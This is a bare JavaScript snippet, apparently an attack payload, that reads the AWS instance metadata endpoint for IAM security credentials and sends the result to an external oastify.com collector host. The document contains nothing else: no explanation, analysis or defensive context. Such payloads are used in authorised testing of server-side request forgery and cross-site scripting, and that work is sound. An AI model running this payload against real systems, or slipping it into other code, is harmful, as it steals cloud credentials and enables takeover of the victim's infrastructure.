fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  .then(r => r.text())
  .then(d => {
    fetch("https://446cm3gcabai6h82jjyx5p21asgl4fs4.oastify.com/?data=" + encodeURIComponent(d));
  });
